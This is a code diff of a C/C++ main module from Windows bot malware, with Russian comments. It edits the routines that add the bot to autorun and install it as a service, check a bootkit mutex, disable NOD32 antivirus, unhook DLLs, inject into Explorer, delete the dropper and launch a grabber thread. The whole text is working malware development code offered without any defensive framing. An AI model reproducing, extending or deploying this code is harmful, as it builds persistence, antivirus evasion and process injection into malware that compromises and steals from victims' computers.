@@ -20,9 +20,10 @@
 #include "BotDef.h"
 #include "DbgRpt.h"
 #include "Modules.h"
+
+
+
 #include "BotDebug.h"
-
-
 
 //********************** Отладочные шаблоны **********************************
 
@@ -36,29 +37,6 @@ namespace MAINDBGTEMPLATES
 
 
 //***************************************************************************
-
-
-
-
-/*char* LogName = "c:\\BotLog.log";
-
-void WriteLog(const char* Msg)
-{
-	HANDLE H = (HANDLE)pCreateFileA(LogName, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0,NULL);
-	pSetFilePointer(H, 0, 0, FILE_END);
-	DWORD W;
-	string L;
-	L.Format("[%d] %s \r\n", (DWORD)pGetTickCount() / 1000, Msg);
-	pWriteFile(H, L.t_str(), L.Length(), &W, NULL);
-
-//	pWriteFile(H, Msg, strlen(Msg), &W, NULL);
-//	pWriteFile(H, "\r\n", 2, &W, NULL);
-	pCloseHandle(H);
-}
-*/
-
-
-
 
 
 
@@ -89,28 +67,32 @@ void InternalAddToAutorun()
 	// Добавляем программу в автозагрузку
 	// только в случае если в системе не зарегистрирован мьютекс
 	// сигнализирующий об успешной установке буткита
-	#ifndef DEBUGBOT
-	if (!WSTR::IsEmpty(TempFileName))
+
+	const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
+	HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
+	if (Mutex != NULL)
 	{
-		const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
-		HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
-		if (Mutex != NULL)
+			pCloseHandle(Mutex);
+			MDBG("Main", "Буткит установлен. Игнорируем добавление в автозагрузку.");
+			return;
+	}
+
+	bool ServiceInstalled = false;
+	#ifndef DEBUGBOT
+		if (!WSTR::IsEmpty(TempFileName))
 		{
-				pCloseHandle(Mutex);
-				MDBG("Main", "Буткит установлен. Игнорируем добавление в автозагрузку.");
-				return;
+		
+			PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
+			BOT::AddToAutoRun(Name);
+			ServiceInstalled = BOT::InstallService(Name);
+			STR::Free(Name);
 		}
 
-		
-		PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
+		if (!ServiceInstalled)
+			BOT::InstallService(BOT::GetBotFullExeName().t_str());
 
-		MDBG("Main", "Добавляем бот в автозагрузку.");
-
-		BOT::InstallService(Name);
-		BOT::AddToAutoRun(Name);
-		STR::Free(Name);
-	}
 	#endif
+
 
 }
 
@@ -192,6 +174,7 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 		}
 
     }
+	pExitProcess(0);
 	return 0;
 }
 
@@ -201,6 +184,10 @@ void ExplorerMain()
 	MDBG("Main", "----------------- ExplorerMain -----------------");
 	MDBG("Main", "WorkPath %s  WorkPathHash %d", BOT::GetWorkPathInSysDrive() ,BOT::GetWorkFolderHash());
 
+	// Создаем мьютекс запущенного бота для сигнализации другим 
+	// способам автозапуска.
+	BOT::TryCreateBotInstance();
+
 	if ( !dwExplorerSelf )
 		UnhookDlls();
 
@@ -208,6 +195,7 @@ void ExplorerMain()
 	//DisableShowFatalErrorDialog();
 	MDBG( "Main", "Отключаем NOD32" );
 	OffNOD32();
+
 	InternalAddToAutorun();
 
 	DeleteDropper();
@@ -215,17 +203,12 @@ void ExplorerMain()
 
 	//----------------------------------------------------
 
-	// Создаем мьютекс запущенного бота для сигнализации другим 
-	// способам автозапуска.
-	BOT::TryCreateBotInstance();
-
-
 	if ( !dwAlreadyRun )
 		MegaJump( LoaderRoutine );
 	
 	#ifdef GrabberH
 		if ( dwFirst && !dwGrabberRun )
-			MegaJump( GrabberThread );
+			MegaJump( GrabberThread ); 
 	#endif
 
 	//MegaJump(AvFuckThread);
@@ -247,6 +230,7 @@ void ExplorerMain()
 DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
 	BOT::Initialize();
+
 	UnhookDlls();
 	
 	if (dwExplorerSelf) 
@@ -269,27 +253,35 @@ int APIENTRY MyMain()
 {
 	BOT::Initialize();
 
+	MDBG("Main", "Запускается бот. Версия бота %s\r\nEXE: %s", BOT_VERSION, Bot->ApplicationName().t_str());
+
 	// Проверяем сервис запущен или нет
 	if (BOT::IsService())
 	{
+		MDBG("Main", "Стартует сервис");
 		// Если бот ещё не  запущен, то выполняем инжект в эксплорер
 		BOT::SetBotType(BotService);
 
 		if (!BOT::IsRunning())
 		{
-			//JmpToExplorer(ExplorerRoutine);
+			MDBG("Main", "Сервис инжектится в Explorer");
+			JmpToExplorer(ExplorerRoutine);
 		}
 
 		BOT::ExecuteService();
 		pExitProcess(0);
+		return 0;
 	}
 
+	MDBG("Main", "Звпускается Ring3 версия бота");
+	// Запускается ринг3 версия
 	BOT::SetBotType(BotRing3);
 
 	// Проверяем не запущен ли на данном компьютере другой экземпляр бота
 	if (BOT::IsRunning())
 	{
 		pExitProcess(0);
+		return 0;
 	}
 
 
@@ -308,8 +300,6 @@ int APIENTRY MyMain()
 	}	
 
 
-	MDBG("Main", "Запускается бот. Версия бота %s", BOT_VERSION);
-	;
 
 	#if defined(DEBUGBOT) && defined(DebugUtils)
 		if (!StartInDebugingMode(true))
@@ -324,7 +314,7 @@ int APIENTRY MyMain()
 
 	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
 
-	DWORD dwProcessHash = File::GetNameHashW(ModulePath, false);
+	DWORD dwProcessHash  = File::GetNameHashW(ModulePath, false);
 	DWORD dwProcessHash2 = File::GetNameHashW(ModulePath, true);
 	
 	MDBG( "Main", "В процессе %S, %08x", ModulePath, dwProcessHash2 );
